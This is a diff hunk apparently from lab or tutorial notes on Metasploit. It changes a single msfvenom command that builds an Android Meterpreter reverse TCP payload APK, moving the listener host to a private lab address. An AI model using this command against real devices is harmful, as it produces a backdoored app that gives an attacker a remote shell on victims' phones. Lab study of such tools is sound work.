@@ -72,7 +72,7 @@ msf >  search type:payload platform:android
 Create a reversed TCP [^ex]
 
 ```
-msf > msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f raw -o reverse_tcp.apk
+msf > msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.6 LPORT=4444 -f raw -o volume/reverse_tcp.apk
 ```
 
 Start a handler:
